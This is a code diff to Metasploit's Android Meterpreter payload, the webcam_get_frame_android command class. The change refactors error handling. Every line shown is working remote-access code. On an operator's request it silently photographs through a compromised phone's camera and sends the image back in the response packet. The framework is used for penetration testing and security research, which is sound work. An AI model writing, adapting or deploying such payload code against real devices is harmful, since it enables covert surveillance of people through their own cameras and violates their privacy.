@@ -1,18 +1,14 @@
 
 package com.metasploit.meterpreter.android;
 
-import android.graphics.PixelFormat;
 import android.hardware.Camera;
 import android.hardware.Camera.Parameters;
 import android.hardware.Camera.PictureCallback;
-import android.util.Log;
 
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 import com.metasploit.meterpreter.stdapi.webcam_audio_record;
-
-import java.lang.Exception;
 
 public class webcam_get_frame_android extends webcam_audio_record implements Command {
 
@@ -26,42 +22,39 @@ public class webcam_get_frame_android extends webcam_audio_record implements Com
 
         int quality = request.getIntValue(TLV_TYPE_WEBCAM_QUALITY);
                 
-        try {
-            if (webcam_start_android.camera == null) {
-                return ERROR_FAILURE;
-            }
+        if (webcam_start_android.camera == null) {
+            return ERROR_FAILURE;
+        }
 
-            cameraData = null;
-            Parameters params = webcam_start_android.camera.getParameters();
-            params.set("jpeg-quality", quality);
-            webcam_start_android.camera.setParameters(params);
+        cameraData = null;
+        Parameters params = webcam_start_android.camera.getParameters();
+        params.set("jpeg-quality", quality);
+        webcam_start_android.camera.setParameters(params);
 
-            webcam_start_android.camera.takePicture(null, null, new PictureCallback() {
-                @Override
-                public void onPictureTaken(byte[] data, Camera camera) {
-                    cameraData = data;
+        webcam_start_android.camera.takePicture(null, null, new PictureCallback() {
+            @Override
+            public void onPictureTaken(byte[] data, Camera camera) {
+                cameraData = data;
 
-                    // Fix webcam_stream
-                    try {
-                        camera.startPreview();
-                    } catch (Exception e) {
-                    }
-
-                    synchronized (webcam_get_frame_android.this) {
-                    	webcam_get_frame_android.this.notify();
-                    }
+                // Fix webcam_stream
+                try {
+                    camera.startPreview();
+                } catch (Exception e) {
                 }
-            });
-            
-            synchronized (this) {
-            	wait(10000);
-            }
 
-            if (cameraData != null) {
-            	response.add(TLV_TYPE_WEBCAM_IMAGE, cameraData);
+                synchronized (webcam_get_frame_android.this) {
+                    webcam_get_frame_android.this.notify();
+                }
             }
-        } catch (Exception e) {
-            Log.e(getClass().getSimpleName(), "webcam error ", e);
+        });
+
+        synchronized (this) {
+            wait(10000);
+        }
+
+        if (cameraData != null) {
+            response.add(TLV_TYPE_WEBCAM_IMAGE, cameraData);
+        } else {
             return ERROR_FAILURE;
         }
 
